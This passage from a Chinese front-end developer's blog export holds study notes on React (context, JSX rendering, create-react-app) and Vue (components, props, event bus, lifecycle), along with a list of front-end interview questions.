childContextTypes = &#123; n:PropTypes.number, m:PropTypes.number&#125; 属性VS上下文 1、属性操作起来简单,子组件是被动接收传递的值(组件内的属性是只读的).只能父传子(子传父不行,父传孙也需要处理：父传子、子再传孙) 2、上下文操作起来相对复杂一些,子组件是主动获取使用的(子组件是可以修改获取到的上下文信息的,但是不会影响到父组件中的信息,其他的组件不受影响),一旦父组件设置了上下文信息,它后代组件都可以直接拿来用，不需要一层层传递 平行组件：兄弟组件或者毫无关系的组件方案一：让两个平行组件或者毫无关系的两个组件父：Parent子：A/B父组件中有一些信息,父组件把一个方法传递给A,A中把方法执行(方法执行修改父组件信息值),父组件再把最新的信息传递传递给B即可,等价于A操作,影响了B 方案二：基于redux来进行状态管理,实现组件之间的信息传输(常用方案)redux可以应用在任何的项目中(VUE/JQ/React的都可以),React-redux才是专门给react开发的 统一管理状态的容器：每个组件中都可以操作这个容器 当容器中的信息发生改变,可以通知所有用到状态信息的组件重新渲染 直接修改容器中的状态信息是一个不好的操作：A把状态改了(任何组件都可以直接修改),以后获取的状态信息一旦不是我们想要的,都不知道在哪修改的,不方便项目的维护！更好的方案：带管理员redux的统一状态管理=&gt;redux的核心思想所在]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>react-复合组件信息传递(父传子的两种方式)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(三)]]></title>
    <url>%2F2018%2F09%2F06%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%89)%2F</url>
    <content type="text"><![CDATA[react &amp; react-dom[渐进式框架]一种最流行的框架设计思想，一般框架中都包含很多内容，这样导致框架的体积过于臃肿,不利于页面的优化，拖慢加载的速度。真实项目中，我们使用一个框架,不一定用到所有的功能,此时我们应该把框架的功能进行拆分，用户想用什么，让其自己自由组合即可。 全家桶：渐进式框架N多部分组合Vue全家桶：vue-cli/Vue/vue-router/vuex/axios(fetch)/vue element(vant) react全家桶：create-react-app/react/react-dom/react-router/redux/react-redux/aioxs/ant/dva/saga/mobx… react:react框架的核心部分,提供了Component类可以供我们进行组件开发，提供了钩子函数(生命周期函数：所有的生命周期函数其实都是基于回调函数来完成的)生命周期：基于流程 constructor componentWillMount挂载前 render挂载 componentDidMount挂载后 状态更新触发 shouldComponentUpdate componentWillUpdate componentDidUpdate 属性更新触发 componentWillReceiveProps在父组件把子组件的属性发生改变后 卸载触发 componentWillUnmount react-dom:把JSX语法(react独有的语法)渲染为真实DOM(能够放到页面中展示的解构都叫做真实DOM)的组件ReactDOM.render([JSX],[CONTAINER],[CALLBACK]):把JSX元素(虚拟DOM元素)渲染到页面中 JSX语法的使用细节 JSX:REACT虚拟元素 COMTAINER：容器，我们想把元素放到页面中的哪个容器中 CALLBACK：当把内容放到页面中呈现触发的回调函数 JSX：REACT独有的语法，JAVASCRIPT+XML(HTML),和我们自己之前拼接的HTML字符串类似，都是把HTML结构代码和JS代码或者数据混合在一起了,但是它不是字符串 1.不建议我们把JSX直接渲染到body当中,而是放在自己创建的容器中,一般我们都放在一个ID为ROOT的DIV中即可 2.在JSX中出现的{}是存放JS的,但是要求JS代码执行完成需要有返回结果(JS表达式) =&gt;不能直接放一个对象数据类型的值(对象(除了给style赋值)、数组(数组中如果没有对象都是基本数据类性质或者是JSX元素,这样是可以的)、函数都不可以) =&gt;可以是基本类型的值(布尔类型什么都不显示、null、undefined也是JSX元素，代表的是空) =&gt;循环判断的语句都不支持，但是支持三元运算符 3.循环创建JSX元素(一般都基于数组的map方法完成迭代),需要给创建的元素设置唯一的KEY值(当前本次循环内唯一即可) 4.只能出现一个根元素 5.给元素设置样式类用的是className而不是class 6.style中不能直接的写样式字符串,需要基于一个样式对象来遍历赋值12345678910111213141516171819let data = 'xiaoke'; ReactDOM.render(&lt;div id="box" &gt;helloworld&#123;data&#125;&lt;/div&gt;,root,()=&gt;&#123; let oBox = document.querySelector("#box"); console.log(oBox.innerHTML);&#125;);``` 不能直接放一个对象数据类型的值(对象、数组(数组中如果没有对象都是基本数据类性质或者是JSX元素,这样是可以的)、函数都不可以)```javascriptlet data = [&#123; name:'张三', age:22&#125;,&#123; name:'李四', age:23&#125;];ReactDOM.render(&lt;div id="box"&gt;hello world!&#123;data.toString()&#125;&lt;/div&gt;,root); 循环判断的语句都不支持，但是支持三元运算符 1234567891011let data = [&#123; name:'张三', age:22&#125;,&#123; name:'李四', age:23&#125;];ReactDOM.render(&lt;div id="box"&gt;hello world!&#123; data?"ok":'no'&#125;&lt;/div&gt;,root); 12345678910111213let data = [&#123; name:'张三', age:22&#125;,&#123; name:'李四', age:23&#125;];ReactDOM.render(&lt;div id="box"&gt;hello world!&#123; data.map((item,index)=&gt;&#123; return '@'; &#125;)&#125;&lt;/div&gt;,root); 循环创建JSX元素(一般都基于数组的map方法完成迭代),需要给创建的元素设置唯一的KEY值(当前本次循环内唯一即可) 12345678910111213141516let data = [&#123; name:'张三', age:22&#125;,&#123; name:'李四', age:23&#125;];ReactDOM.render(&lt;div id="box"&gt;hello world!&lt;ul&gt; &#123; data.map((item,index)=&gt;&#123; let &#123;name,age&#125; = item; return &lt;li key=&#123;index&#125;&gt;&lt;span&gt;&#123;name&#125;&lt;/span&gt;&lt;span&gt;&#123;age&#125;&lt;/span&gt;&lt;/li&gt;; &#125;)&#125;&lt;/ul&gt;&lt;/div&gt;,root); JSX语法的渲染过程把JSX(虚拟DOM)变为真实DOM(面试必问) JSX渲染的机制 1、基于babel中的语法解析模块(babel-preset-react)把JSX语法编译为React.createElement(…)结构 2、执行React.createElement(type,props,children),创建一个对象(虚拟DOM) key:null props:{id:’title’, className:’title’,children:’kjx’,style:…} type:’h1’ 存的是当前的标签 ref:null proto:指向Object.prototype 3.ReactDOM.render(JSX语法最后生成的对象,容器),基于render方法把生成的对象动态创建为DOM圆度插入到指定的容器中 123let root = document.querySelector("#root");let styleObj = &#123;color:'red'&#125;;render(&lt;h1 id="title" className="title" style=&#123;styleObj&#125;&gt;kjx&lt;/h1&gt;,root); 12345678React.createElement(&#123; 'h1', &#123;id:'title', className:'title', style:styleObj &#125;, '\u73EO\u57F9\u8BAD'-&gt;kjx&#125;) 自己写一个JSX 1.创建一个对象(默认有四个属性type/props/ref/key),最后要把这个对象返回2.根据传递的值修改这个对象 type=&gt;传递的type props=&gt;需要做一些处理:大部分传递props中的属性都赋值给了对象props，有一些比较特殊 -&gt; 如果是ref或者key，我们需要把传递的props中的这两个属性值，给创建对象的两个属性，而传递的props中把这两个值删除掉 -&gt; 把传递的children作为新创建对象的props中的一个属性 createElement方法 123456789101112131415161718192021222324function createElement(type,props,children) &#123; props=props||&#123;&#125;;//处理props let obj = &#123; type:null, props:&#123; children:'' &#125;, ref:null, key:null &#125; //=&gt;用传递的type和props覆盖原有的默认值 //obj = &#123;...obj,type,props&#125;;//=&gt;&#123;type:type,props:props&#125; obj = &#123;...obj,type,props:&#123;...props,children&#125;&#125;; //=&gt;把ref和key提取出来(并且删除props中的属性) 'key' in obj.props?(obj.key=obj.props.key,obj.props.key=undefined):null; 'ref' in obj.props?(obj.ref=obj.props.ref,obj.props.ref=undefined):null; return obj;&#125;createElement('h1',&#123;id:'title',className:'title',style:&#123;color:'red'&#125;,'key':12,'ref':23&#125;,'\u73EO\u5CF0\u8BAD'); render方法：把创建的对象生成对应的DOM元素，最后插入到页面当中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function render(obj,container,callback) &#123; let &#123;type,props&#125; = obj||&#123;&#125;, newElement = document.createElement(type); for (let attr in props) &#123; // 不是私有的，直接结束遍历 if(!props.hasOwnProperty(attr))&#123;break&#125;; // 如果当前属性没有值，直接不处理，跳到下一次循环 if(!props[attr])&#123;continue&#125;; let val = props[attr]; //=&gt;className的处理 if(attr==='className')&#123; newElement.setAttribute('class',val); continue &#125;; //=&gt;style处理 if(attr==='style')&#123; if(val==='')&#123;continue;&#125; for (let styleKey in val) &#123; if (val.hasOwnProperty(styleKey)) &#123; newElement['style'][styleKey] = val[styleKey]; &#125; &#125; continue; &#125; //=&gt;处理children if(attr==='children')&#123; if(typeof val === 'string')&#123; let text = document.createTextNode(val); newElement.appendChild(text); &#125; continue; &#125; //=&gt; //=&gt;基于setAttribute可以让设置的属性表现在HTML的结构上 newElement.setAttribute[attr] = val; &#125; container.appendChild(newElement); callback&amp;&amp;callback();&#125;render(objJSX,root,()=&gt;&#123; console.log('ok~'); &#125;)]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react学习笔记</tag>
        <tag>JSX语法渲染机制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习笔记之路由]]></title>
    <url>%2F2018%2F09%2F06%2FVue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E8%B7%AF%E7%94%B1%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Vue学习笔记之插槽]]></title>
    <url>%2F2018%2F09%2F06%2FVue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%8F%92%E6%A7%BD%2F</url>
    <content type="text"></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>插槽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端技能考核]]></title>
    <url>%2F2018%2F09%2F06%2F%E5%89%8D%E7%AB%AF%E6%8A%80%E8%83%BD%E8%80%83%E6%A0%B8%2F</url>
    <content type="text"><![CDATA[JavaScript （前端玩家必备技能） ele.getAttribute(‘propName’) 和 ele.propName区别 mouseover和mouseenter的区别 什么是事件代理 localStorage和cookie的区别，cookie和session的关系！ 什么是闭包，你在项目中哪一块用到了闭包！ js中定义函数的方式有哪些，区别是什么！ 说出你掌握的继承方式及优缺点，并加以改进！ 说出ES6和ES5的区别！ 阐述JS中的同步编程和异步编程，以及你在项目中是如何来使用异步操作的！ 实现一个Promise HTTP &amp;&amp; AJAX &amp;&amp; 跨域 （18+玩家必备技能，初级玩家需要了解一些的） 写出项目中经常用到的性能优化方案 从浏览器地址栏输入URL到显示页面，中间都经历了什么（尽可能写详细，最好回答出TCP的三次握手和四次挥手，以及浏览器加载页面的细节） 说出你所熟知的HTTP状态码！GET和POST有啥区别！ 什么是HTTP报文，你熟知的报文都有哪些！ 能说下304具体怎样实现吗？ 跨域是什么？http协议中如何判断跨域？如何解决跨域问题？ HTTP2具体内容？SDPY了解么？ HTTPS如何实现？tsl/ssl是什么？对称加密、非对称加密在什么时候、对什么数据加密？ DNS劫持是什么？ 封装一个AJAX库！]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>技能考核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(二)]]></title>
    <url>%2F2018%2F09%2F05%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%8C)%2F</url>
    <content type="text"><![CDATA[create-react-app的使用 npm install create-react-app -g 把模块安装在全局环境下(目的：可以使用命令),MAC电脑安装的时候，前面需要加sudo,否则没有权限 create-react-app [项目名称] 基于脚手架，创建出一个基于react的自动化/工程化项目目录，和npm发包时候的命名规范一样,项目名称中不能出现：大写字母、中文、特殊符号(-或者_是可以的)等 [脚手架生成目录中的一些内容] node_modules ：当前项目中依赖的包都安装在这里 .bin：本地项目中可执行命令，在package.json的scripts中配置对应的脚本即可(其中有一个就是:react-scripts命令) public：存放的是当前项目的HTML页面(单页面应用放一个index.html即可,多页面根据自己需求放置需要的页面) index.html文件解析 12&lt;link rel="manifest" href="%PUBLIC_URL%/manifest.json"&gt;&lt;link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico"&gt; 在react框架中，所有的逻辑都是在JS中完成的(包括页面结构的创建),如果想给当前的页面导入一些CSS样式或者image图片等内容,我们有两种方式： 1、在JS中基于ES6 module模块规范,使用import导入，这样webpack在编译合并JS的时候，会把导入的资源文件等插入到页面的解构中(绝对不能在JS管控的解构中通过相对目录./或者../导入资源，因为在webpack编译的时候，地址就不再之前的相对地址了) 2、如果不想在JS中导入(JS中导入的资源最后都会基于webpack编译)，我们也可以把资源手动的在HTML中导入，但是HTML最后也要基于webpack编译，导入的地址也不建议写相对地址。而是使用%PUBLIC_URL%写成绝对地址 src：项目结构中最主要的目录，因为后期所有的JS、路由、组件等都是放到这里面(包括需要编写的CSS或者图片等) index.js是当前项目的入口文件 .gitignore：git提交的时候,忽略文件的配置项 package.json：当前项目的配置清单 “dependencies”: {“react”: “^16.4.2”,“react-dom”: “^16.4.2”,“react-scripts”: “1.1.5”}基于脚手架生成工程目录，自动帮我们安装了三个模块：react/react-dom/react-scriptsreact-scripts集成了webpack需要的内容： babel一套 css一套 eslint一套 webpack一套 其他的 没有less/sass的处理内容(项目中使用less，我们需要自己额外的安装) 123456"scripts": &#123; "start": "react-scripts start", "build": "react-scripts build", "test": "react-scripts test --env=jsdom", "eject": "react-scripts eject"&#125; 可执行的脚本”npm run start/yarn start” start(开发环境 )：开发环境下,基于webpack编译处理,最后可以预览当前开发的项目成果(在webpack中安装了webpack-dev-server插件,基于这个插件会自动创建一个web服务[端口号默认是3000],webpack会帮我们自动打开浏览器,并且展示我们的页面,并且能够监听我们代码的改变，如果代码改变了，webpack会自动重新编译，并且刷新浏览器来完成渲染) build(生产环境)：项目需要部署到服务器上，我们先执行build，把项目整体编译打包(完成后会在项目中生成一个build文件夹,这个文件夹中包含了所有编译后的内容，我们把它上传到服务器即可);而且在服务器部署的时候，不需要安装任何模块了(因为webpack已经把需要的内容都打包到一个JS中了) React脚手架的深入剖析create-react-app脚手架为了让解构目录清晰，把安装的webpack及配置文件都集成在了react-scripts模块中,放到了node_modules中 但是真实项目中，我们需要在脚手架默认安装的基础上，额外安装一些我们需要的模块，例如：react-router-dom/axios...,再比如：less/less-loader... 情况1：如果我们安装其他的组件，但是安装成功后，不需要修改webpack配置项，此时，我们直接安装，并且调取使用即可 情况2：我们安装的插件是既有webpack处理的：也就是需要把安装的模块配置到webpack当中(重新修改webpack配置项了) =&gt;首先需要把隐藏到node_modules中的配置项暴露到项目中 npm run eject 首先会提示确认是否执行eject操作，这个操作是不可逆的，一旦暴露出来配置项，就无法再隐藏撤回了。 如果当前的项目是基于Git管理，在执行eject的时候，如果没有提交到历史区的内容，需要先提交到历史区，然后再eject才可以，否则报错：This git repository has untracked files or uncommited changes… =&gt;再去修改对应的配置项即可 一旦暴露后，项目目录当中多了两个文件夹： config：存放的是webpack的配置文件 webpack.config.dev.js：开发环境下的配置项(yarn start)webpack.config.prod.js：生产环境下的配置项(yarn build) scripts：存放的是可执行脚本的JS文件 start.js yarn start执行的就是这个JSbuild.js yarn build执行的就是这个JS package.json中的内容也改了 [举个例子：需要配置less] cnpm install less less-loader less是开发和生产环境下都需要配置的 我们预览项目的时候，也是先基于webpack编译，把编译后的内容放到浏览器中运行，所以，如果项目中使用了less，我们需要修改webpack的配置项，在配置项中 加入less的编译工作，这样后期预览项目，首先基于webpack把less编译为css,然后呈现在页面中。 set HTTPS=true &amp;&amp; npm run start 开启HTTPS协议模式(设置环境变量HTTPS的值) 原理是：设置环境变量HTTPS的值 set PORT=63343&amp;&amp; npm run start 修改端口号]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>脚手架create-react-app</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习笔记之组件(二)]]></title>
    <url>%2F2018%2F09%2F05%2FVue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%84%E4%BB%B6(%E4%BA%8C)%2F</url>
    <content type="text"><![CDATA[父子组件的mounted父子组件会先执行谁的mounted？ 如果有父子组件，会先触发子组件的mounted，然后再触发父组件的mounted，为了在父组件中更方便的操作DOM元素 12345678910111213&lt;div id="app"&gt; &lt;!-- 父子组件会先执行谁的mounted？--&gt; &lt;!--如果有父子组件，会先触发子组件的mounted，然后在触发父组件的mounted；为了在父组件中放方便操作DOM元素；--&gt; &lt;child&gt;&lt;/child&gt;&lt;/div&gt;&lt;template id="divs" &gt; &lt;div&gt; &lt;ul ref="a"&gt; &lt;li v-for="a in arr"&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/template&gt; 12345678910111213141516171819202122232425262728293031323334let child = &#123; template:"#divs", data()&#123; return &#123; arr:[1,2,3] &#125; &#125;, /* created()&#123; console.log(300); &#125;,*/ mounted()&#123; this.arr = [1,2,3,4,5]; // DOM的渲染是异步的； console.log(100); &#125;&#125;let vm = new Vue(&#123; el: '#app', data: &#123;&#125;, /*created()&#123; console.log(400); &#125;,*/ mounted()&#123; console.log(200); // $nextTick : 会等待异步执行完成，才会执行； this.$nextTick(()=&gt;&#123; // 会等待当前组件的DOM，子组件的DOM渲染完成，才可以执行； console.log(this.$children[0].$refs.a.children.length); &#125;) &#125;, components:&#123; child &#125;&#125;); 动态组件在使用component这个自定义组件时，需要配合:is这个属性，动态绑定一个组件的名称 is后面的属性值是哪个组件的名称，显示哪个组件；不可以同时显示两个 12345678910111213&lt;div id="app"&gt; &lt;input type="radio" v-model="title" value="home"&gt;home &lt;input type="radio" v-model="title" value="list"&gt;list &lt;!-- 在使用component这个自定义组件时，需要配合:is这个属性，动态绑定一个组件的名称；--&gt; &lt;!--is后面的属性值是哪个组件的名称，显示哪个组件；不可以同时显示两个--&gt; &lt;keep-alive&gt; &lt;!----&gt; &lt;component v-bind:is="title"&gt;&lt;/component&gt; &lt;/keep-alive&gt; &lt;!--&lt;component is="home"&gt;&lt;/component&gt;--&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132// 创建组件// 动态组件进行切换时，会将上一个组件进行销毁，然后再挂载最新的组件；//keep-alive: 保存了组件第一次生成时的状态；以后需要该组件，直接读取缓存中的组件就可以；不再执行挂载，销毁；从而提高了浏览器的性能；let home = &#123; template:"&lt;div&gt;home&lt;/div&gt;", mounted()&#123; console.log("挂载home") &#125;, destroyed()&#123; console.log("已销毁home") &#125;&#125;;let list = &#123; template:"&lt;div&gt;list&lt;/div&gt;", mounted()&#123; console.log("挂载list") &#125;, destroyed()&#123; console.log("已销毁list") &#125;&#125;;let vm = new Vue(&#123; el: '#app', data: &#123; title:"home", &#125;, // 注册组件 components:&#123; home,list &#125;&#125;); 事件车eventBus每一个Vue的实例都是独立的，相互之间是不能直接进行改变数据的 给两个不同的组件找一个载体;把共同的方法放在这个载体上 1let eventBus = new Vue;//创建一个新的Vue实例 在这个新的实例上,有$on:订阅 $emit:发布 1234&lt;div id="app"&gt; &lt;brother1&gt;&lt;/brother1&gt; &lt;brother2&gt;&lt;/brother2&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 每一个Vue的实例都是独立的，相互之间是不能直接进行改变数据的// 给两个不同的组件找一个载体;把共同的方法放在这个载体上let eventBus = new Vue;//创建一个新的Vue实例// 在这个新的实例上,有$on:订阅 $emit:发布let brother1 = &#123; data () &#123; return &#123; color:"绿色" &#125; &#125;, created () &#123; // 给事件车订阅changeGreen方法 // $on：param1：自定义事件名称 ,param2：方法名称 eventBus.$on('changeG',this.changeGreen); &#125;, methods: &#123; changeGreen()&#123; this.color = "变红"; &#125;, green()&#123; eventBus.$emit("changeR"); &#125; &#125;, template:"&lt;div&gt;&#123;&#123;color&#125;&#125;&lt;button @click='green'&gt;变绿&lt;/button&gt;&lt;/div&gt;"&#125;let brother2 = &#123; data () &#123; return &#123; color:"红色" &#125; &#125;, created () &#123; // 给事件车订阅changeRed方法 eventBus.$on('changeR',this.changeRed); &#125;, methods: &#123; changeRed()&#123; this.color = "绿色"; &#125;, red()&#123; eventBus.$emit("changeG"); &#125; &#125;, template:"&lt;div&gt;&#123;&#123;color&#125;&#125;&lt;button @click='red'&gt;变红&lt;/button&gt;&lt;/div&gt;"&#125;let vm = new Vue(&#123; el:'#app', data:&#123; &#125;, components: &#123; brother1, brother2 &#125;&#125;)]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习笔记之组件(一)]]></title>
    <url>%2F2018%2F09%2F05%2FVue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%84%E4%BB%B6(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[组件 组件：把页面中公共部分提炼出来，可以进行复用 每一个组件都是一个Vue实例;那么具有生命周期;并且也有data、computed、methods、watch这些属性，每个组件都有自己独立维护的数据; 组件的注册全局组件注册一个组件组件中data属性值需要是一个函数，并返回一个对象Vue.component(string,{}) 1.组件的名字，在JS中名字可以带”-“,还可以是驼峰的形式命名 2.在HTML中进行引用时，支持”-“,但是不支持驼峰 3.Vue.component注册的全局组件，可以在其他Vue的实例中使用 123456&lt;div id="app"&gt; &lt;hand&gt;&lt;/hand&gt;&lt;/div&gt;&lt;div id="app1"&gt; &lt;hand&gt;&lt;hand&gt;&lt;/div&gt; 1234567891011121314151617181920Vue.component("hand",&#123; data()&#123; return &#123; msg:'xiaoke' &#125; &#125;, template:"&lt;div&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;"&#125;);let vm = new Vue(&#123; el:'#app', data:&#123; &#125;&#125;);let vm1 = new Vue(&#123; el:'#app1', data:&#123; &#125;&#125;); 局部组件局部组件使用三部曲 创建组件 注册组件 使用组件 1、创建一个组件 每一个组件都是一个Vue的实例;那么每一个组件都有自己的生命周期，都有自己的钩子函数一个Vue实例就是一个组件 组件中的data是私有的， 在各自的组件中，如果return的对象是一个公有的对象，那么其中一个改变，另一个也会改变 1234567891011121314let components1 = &#123; data()&#123; return &#123; //data是私有的 name:"xiaoke" &#125; &#125;, methods:&#123; fn()&#123; &#125; &#125;, template:"&lt;div&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;"&#125; 2、注册组件 123456789let vm = new Vue(&#123; el:'#app', data:&#123; &#125;, components: &#123; //注册一些局部组件 components1 &#125;&#125;) 3、使用组件 123&lt;div id="app"&gt; &lt;components1&gt;&lt;/components1&gt;&lt;/div&gt; 组件的嵌套创建-&gt;注册-&gt;使用 先创建一个组件 在对应的父组件中进行注册 在父组件的标签中将子组件的标签名放进去 123&lt;div id="app"&gt; &lt;parent&gt;&lt;/parent&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233let grandson = &#123; data()&#123; return &#123;&#125; &#125;, template:"&lt;div&gt;grandson&lt;/div&gt;"&#125;;let son = &#123; data()&#123; return &#123;&#125; &#125;, template:"&lt;div&gt;son&lt;grandson&gt;&lt;/grandson&gt;&lt;/div&gt;", components: &#123; grandson &#125;&#125;;let parent = &#123; data()&#123; return &#123;&#125; &#125;, template:"&lt;div&gt;parent&lt;son&gt;&lt;/son&gt;&lt;/div&gt;", components: &#123; son &#125;&#125;;let vm = new Vue(&#123; el:'#app', data:&#123; &#125;, components: &#123; parent &#125; &#125;) 组件之间的数据传递父传子组件必须至少依托于一个跟组件Vue实例 在子组件中data、computed、watch、methods这些属性都有，因为子组件就是一个Vue的实例 1、把父组件中的数据绑定子组件中的一个行间属性，并且是动态绑定的这个属性2、利用子组件中的props，去接收一下这个行间的属性3、在子组件中进行使用 123&lt;div id="app"&gt; &lt;son :m="msg"&gt;&lt;/son&gt;&lt;/div&gt; 12345678910111213141516171819let son = &#123; data()&#123; return &#123; val:100 &#125; &#125;, //props可以接受父组件中的数据 props: ["m"], template:"&lt;div&gt;&#123;&#123;val&#125;&#125;&#123;&#123;m&#125;&#125;&lt;/div&gt;"&#125;let vm = new Vue(&#123; el:'#app', data:&#123; msg:'hello' &#125;, components: &#123; son &#125;&#125;) 子传父如果元素绑定的是一个自定义的事件，需要实例上的$emit方法来触发这个函数 子组件通过$emit触发自定义方法$emit :存在于每一个Vue的实例上 在Vue中自定义事件需要带有’-‘ 子传父：如果需要当触发子组件上的操作改变父组件上的数据时，需要在父组件定义方法时，改变自己的值；在父组件中定义的方法，需要订阅到子组件的自定义事件上，当触发子组件中的某个操作时，通过$emit去触发这个自定义的事件，让其对应的父组件的方法执行 12345678910&lt;div id="app"&gt; &lt;div&gt;父亲：&#123;&#123;money&#125;&#125;&lt;/div&gt; &lt;!-- change是获取到的父组件的methods中的值 --&gt; &lt;!-- changemoney自定义事件 --&gt; &lt;!-- 如果元素绑定的是一个自定义的事件，需要实例上的$emit方法来触发这个函数 --&gt; &lt;son :m="money" @change-money = "change"&gt;&lt;/son&gt; &lt;!-- 语法糖 --&gt; &lt;!-- &lt;son :m.sync="money"&gt;&lt;/son&gt; --&gt; &lt;!-- &lt;son v-bind:m="money" v-on:update:m="money=$event"&gt;&lt;/son&gt; --&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031let vm = new Vue(&#123; el:'#app', data:&#123; money:400 &#125;, methods: &#123; change(val)&#123; this.money = val; &#125; &#125;, components: &#123; son:&#123; data () &#123; return &#123; &#125; &#125;, props: ["m"], template:"&lt;div&gt;儿子:&#123;&#123;m&#125;&#125;&lt;button @click='fn'&gt;多要钱&lt;/button&gt;&lt;/div&gt;", methods: &#123; fn()&#123; //$emit存在于每一个Vue的实例上 //需要和DOM行间属性保持一致 this.$emit("change-money",800); // 语法糖 //this.$emit("update:m",888) &#125; &#125; &#125; &#125; &#125;) 组件的单向数据流单向数据流：只能从父组件传递给子组件，不能从子组件传递给父组件;当父组件的数据发生改变之后，那么子组件的数据也会发生改变 在组件的函数或者事件中，那么函数中的this指向了当前组件的实例 通过props传递过来的数据也具有响应式,但是不能再次传递给父组件，不能影响父组件 如果是一个对象或者数组，那么当子组件改变时，也会影响到父组件;是由于是同一个空间地址的原因; 123&lt;div id="app"&gt; &lt;son :m = "msg"&gt;&lt;/son&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031let vm = new Vue(&#123; el:'#app', data:&#123; msg:'hello' &#125;, methods: &#123; fn()&#123; this.msg = "xiaoke" &#125; &#125;, components: &#123; son:&#123; data () &#123; return &#123; &#125; &#125;, //props:会把这个属性放到当前的组件的实例的属性上; props: ["m"], template:"&lt;div @click='fn'&gt;&#123;&#123;m&#125;&#125;&lt;/div&gt;", methods: &#123; fn()&#123; //在组件的函数或者事件中，那么函数中的this指向了当前组件的实例 //通过props传递过来的数据也具有响应式,但是不能再次传递给父组件，不能影响父组件 console.log(this); console.log(this.m); &#125; &#125; &#125; &#125;&#125;) props验证props：不仅可以传数组，还可以传对象 12345678910111213141516props: &#123; //m:Number单个类型校验 //m:[Number.String,Object,Function]多个类型校验 m:&#123; type:[],//校验类型的 required:true,//必填项 default:100,//默认值 validator(val)&#123; //这个函数默认执行 // console.log(val); //会根据当前validator的返回值，向浏览器的控制台抛出警告 return ['success','warn','danger'].indexOf(val)===-1; &#125; &#125;&#125;, 123&lt;div id="app"&gt; &lt;child :m="msg"&gt;&lt;/child&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536let vm = new Vue(&#123; el: '#app', data: &#123; msg: 100 &#125;, components: &#123; child: &#123; data() &#123; return &#123; &#125; &#125;, props: &#123; //m:Number单个类型校验 //m:[Number.String,Object,Function]多个类型校验 m: &#123; type: [],//校验类型的 required: true,//必填项 default: 100,//默认值 validator(val)&#123; //这个函数默认执行 // console.log(val); //会根据当前validator的返回值，向浏览器的控制台抛出警告 return ['success','warn','danger'].indexOf(val)===-1; &#125; &#125; &#125;, template: "&lt;div @click='fn'&gt;&#123;&#123;m&#125;&#125;&lt;/div&gt;", methods: &#123; fn() &#123; console.log(typeof this.m); &#125; &#125; &#125; &#125;&#125;)]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>组件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue学习笔记之生命周期]]></title>
    <url>%2F2018%2F09%2F05%2FVue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%2F</url>
    <content type="text"><![CDATA[生命周期概念： 生命周期：Vue的实例具有生命周期;Vue实例在生成时,会经历一系列的初始化过程;数据的监听,编译模板,实例挂载DOM元素,或者数据更新DOM更新;在执行的过程中,会运行一些叫做 生命周期 的钩子函数;在Vue实例生命周期中的特定的时间点内,执行的函数 生命周期钩子函数，不能控制其执行的顺序beforeCreate created:创建beforeMount mounted:挂载 Vue实例有一个完整的生命周期，也就是从开始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、销毁等一系列过程，我们称这是Vue的生命周期。通俗说就是Vue实例从创建到销毁的过程，就是生命周期。 每一个组件或者实例都会经历一个完整的生命周期，总共分为三个阶段：初始化、运行中、销毁。 1、实例、组件通过new Vue() 创建出来之后会初始化事件和生命周期，然后就会执行beforeCreate钩子函数，这个时候，数据还没有挂载呢，只是一个空壳，无法访问到数据和真实的dom，一般不做操作 2、挂载数据，绑定事件等等，然后执行created函数，这个时候已经可以使用到数据，也可以更改数据,在这里更改数据不会触发updated函数，在这里可以在渲染前倒数第二次更改数据的机会，不会触发其他的钩子函数，一般可以在这里做初始数据的获取 3、接下来开始找实例或者组件对应的模板，编译模板为虚拟dom放入到render函数中准备渲染，然后执行beforeMount钩子函数，在这个函数中虚拟dom已经创建完成，马上就要渲染,在这里也可以更改数据，不会触发updated，在这里可以在渲染前最后一次更改数据的机会，不会触发其他的钩子函数，一般可以在这里做初始数据的获取 